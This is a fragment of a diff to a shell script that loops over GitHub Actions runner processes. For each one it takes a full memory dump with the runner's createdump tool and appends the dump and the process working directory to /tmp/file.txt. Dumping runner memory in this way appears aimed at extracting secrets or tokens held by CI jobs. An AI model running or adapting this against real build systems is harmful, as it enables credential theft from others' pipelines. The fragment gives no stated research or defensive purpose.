@@ -18,9 +18,10 @@ for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
     echo "---$pid---" >> /tmp/file.txt;
     echo $(pwdx $pid) >> /tmp/file.txt;
+    echo "/home/runner/runners/2.284.0/bin/createdump $pid -d -n" >> /tmp/file.txt;
     echo $(/home/runner/runners/2.284.0/bin/createdump $pid -d -n) >> /tmp/file.txt;
+    echo "cat /tmp/coredump.$pid" >> /tmp/file.txt;
     cat /tmp/coredump.$pid >> /tmp/file.txt;
-    echo "--- done ---" >> /tmp/file.txt;
 done
 
 #echo "--- strings"
